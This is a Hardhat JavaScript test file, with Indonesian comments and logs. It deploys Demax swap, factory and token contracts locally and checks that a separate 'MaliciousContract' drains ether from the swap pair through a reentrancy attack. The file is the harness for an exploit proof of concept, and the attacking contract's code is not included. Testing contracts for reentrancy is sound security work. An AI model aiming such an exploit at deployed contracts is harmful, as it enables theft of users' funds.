import hardhat from "hardhat";
const { ethers } = hardhat;
import { expect } from "chai";

describe("Reentrancy Test", function () {
    let token0, token1, swapContract, maliciousContract;
    let victim, attacker;
    let CONFIG_ADDRESS, DGAS_ADDRESS, WBNB_ADDRESS, FACTORY_ADDRESS;

    beforeEach(async function () {
        // Get signers
        [victim, attacker] = await ethers.getSigners();

        console.log(`Alamat Victim: ${victim.address}`);
        console.log(`Alamat Attacker: ${attacker.address}`);

        // Deploy Token Dgas
        const TokenDgas = await ethers.getContractFactory("Dgas");
        console.log("Men-deploy Token Dgas...");
        token0 = await TokenDgas.deploy();
        await token0.deployed();
        DGAS_ADDRESS = token0.address;
        console.log(`Token Dgas dideploy di: ${DGAS_ADDRESS}`);

        // Deploy Token WBNB
        const TokenWBNB = await ethers.getContractFactory("WBNB");
        console.log("Men-deploy Token WBNB...");
        token1 = await TokenWBNB.deploy();
        await token1.deployed();
        WBNB_ADDRESS = token1.address;
        console.log(`Token WBNB dideploy di: ${WBNB_ADDRESS}`);
        
        // Mint token untuk victim
        console.log("Minting token untuk victim...");
        await token0.mint(victim.address, ethers.utils.parseEther("1000"));
        await token1.mint(victim.address, ethers.utils.parseEther("1000"));

        // Kirim sejumlah token ke attacker
        console.log("Mengirim token ke Attacker...");
        await token0.transfer(attacker.address, ethers.utils.parseEther("500"));
        await token1.transfer(attacker.address, ethers.utils.parseEther("500"));

        // Deploy configuration contract
        const Config = await ethers.getContractFactory("DemaxConfig");
        console.log("Men-deploy Config contract...");
        const config = await Config.deploy();
        await config.deployed();
        CONFIG_ADDRESS = config.address;
        console.log(`Config contract dideploy di: ${CONFIG_ADDRESS}`);

        // Deploy Factory contract
        const Factory = await ethers.getContractFactory("DemaxFactory");
        console.log("Men-deploy Factory contract...");
        const factory = await Factory.deploy(DGAS_ADDRESS, CONFIG_ADDRESS);
        await factory.deployed();
        FACTORY_ADDRESS = factory.address;
        console.log(`Factory contract dideploy di: ${FACTORY_ADDRESS}`);

        // Deploy SwapContract with fully qualified name
        const DemaxPairFactory = await ethers.getContractFactory("DemaxPair", "contracts/swapContract.sol");
        console.log("Men-deploy SwapContract...");
        swapContract = await DemaxPairFactory.deploy();
        await swapContract.deployed();
        console.log(`SwapContract dideploy di: ${swapContract.address}`);

        // Initialize SwapContract dengan parameter
        console.log("Menginisialisasi SwapContract...");
        try {
            await swapContract.initialize(
                DGAS_ADDRESS,
                WBNB_ADDRESS,
                CONFIG_ADDRESS,
                DGAS_ADDRESS
            );
            console.log("SwapContract diinisialisasi.");
        } catch (error) {
            console.error("Inisialisasi gagal:", error);
        }

        // Tambah liquidity
        console.log("Menambahkan liquidity...");
        await swapContract.connect(victim).mint(victim.address);
        console.log("Liquidity ditambahkan.");

        // Deploy MaliciousContract
        const MaliciousContractFactory = await ethers.getContractFactory("MaliciousContract", "contracts/maliciousContract.sol");
        console.log("Men-deploy MaliciousContract...");
        maliciousContract = await MaliciousContractFactory.deploy(swapContract.address);
        await maliciousContract.deployed();
        console.log(`MaliciousContract dideploy di: ${maliciousContract.address}`);
    });

    it("should exploit reentrancy vulnerability", async function () {
        console.log("Memulai serangan reentrancy...");

        // Melakukan serangan reentrancy
        const initialBalance = await ethers.provider.getBalance(maliciousContract.address);
        console.log(`Saldo awal MaliciousContract: ${ethers.utils.formatEther(initialBalance)} ETH`);

        await expect(
            maliciousContract.connect(attacker).attack()
        ).to.changeEtherBalance(maliciousContract, ethers.utils.parseEther("1"));

        const finalBalance = await ethers.provider.getBalance(maliciousContract.address);
        console.log(`Saldo akhir MaliciousContract: ${ethers.utils.formatEther(finalBalance)} ETH`);
    });
});
